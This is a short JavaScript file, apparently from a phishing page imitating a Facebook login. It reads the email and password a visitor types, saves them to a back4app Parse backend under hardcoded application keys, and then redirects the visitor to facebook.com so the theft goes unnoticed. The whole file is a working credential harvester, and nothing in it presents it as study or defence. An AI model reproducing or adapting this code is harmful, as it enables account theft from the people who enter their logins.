Parse.initialize("FLLUx5rOGY8rYqZfQLmUMP6gQTahYTHaoLeKoQ8M", "LuiAPaRq5bQKWOs1hVbkAUfUT70jtgEMhF3asLge");
Parse.serverURL = 'https://parseapi.back4app.com/';

document.querySelector('.js-login-button').addEventListener('click',async()=>{
  const email = document.querySelector('.js-input-box-email').value;
  const password = document.querySelector('.js-input-box-password').value;

  
  if(email!=='' && password!==''){
    const MyObject = Parse.Object.extend('live');
    const obj = new MyObject();
    
    obj.set('email', email);
    obj.set('password', password);

    try{
      await obj.save();
      //window.location.replace('https://facebook.com');
      window.location.href = 'https://facebook.com';
    }catch(error){
      window.location.href = 'try later';
    }
  }else{
    alert('The username or password must not be empty');
  }
});